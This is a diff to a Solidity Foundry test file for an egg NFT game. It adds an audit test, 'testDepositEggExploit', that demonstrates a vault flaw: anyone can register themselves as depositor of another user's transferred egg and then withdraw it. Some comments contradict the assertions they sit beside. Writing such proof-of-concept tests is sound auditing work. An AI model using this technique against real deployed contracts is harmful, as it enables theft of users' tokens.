@@ -16,7 +16,6 @@ contract EggGameTest is Test {
 
     error OwnableUnauthorizedAccount(address account);
 
-
     function setUp() public {
         owner = address(this); // The test contract is the deployer/owner.
         alice = address(0x1);
@@ -255,5 +254,51 @@ contract EggGameTest is Test {
         // Attempting to withdraw an egg that has not been deposited should revert.
         vm.expectRevert("Egg not in vault");
         vault.withdrawEgg(40);
+    }
+
+    //AUDIT TESTS
+    function testDepositEggExploit() public {
+        // Mint an egg by simulating a call from the game contract.
+        vm.prank(address(game));
+        bool success = nft.mintEgg(alice, 1);
+        assertTrue(success);
+        // Check that token 1 is owned by alice.
+        assertEq(nft.ownerOf(1), alice);
+        // Verify that the totalSupply counter increments.
+        assertEq(nft.totalSupply(), 1);
+
+        //Transger egg to vault
+        vm.prank(alice);
+        nft.approve(address(vault), 1);
+        vm.prank(alice);
+        nft.transferFrom(address(alice), address(vault), 1);
+
+        // Deposit the egg into the vault.
+        vm.prank(bob);
+        vault.depositEgg(1, bob);
+        // The egg should now be marked as deposited.
+        assertTrue(vault.isEggDeposited(1));
+        // The depositor recorded should be alice, but the vault allows for anyone to input depositor
+        assertEq(vault.eggDepositors(1), bob);
+
+        // Depositing the same egg again should revert.
+        vm.prank(alice);
+        vm.expectRevert("Egg already deposited");
+        vault.depositEgg(1, alice);
+
+        // Withdrawal by someone other than the original depositor should revert.
+        vm.prank(alice);
+        vm.expectRevert("Not the original depositor");
+        vault.withdrawEgg(1);
+
+        // Correct withdrawal by the depositor.
+        vm.prank(bob);
+        vault.withdrawEgg(1);
+        // After withdrawal, alice should be the owner again.
+        assertEq(nft.ownerOf(1), bob);
+        // The stored egg flag should be cleared.
+        assertFalse(vault.isEggDeposited(1));
+        // And the depositor mapping should be reset to the zero address.
+        assertEq(vault.eggDepositors(1), address(0));
     }
 }
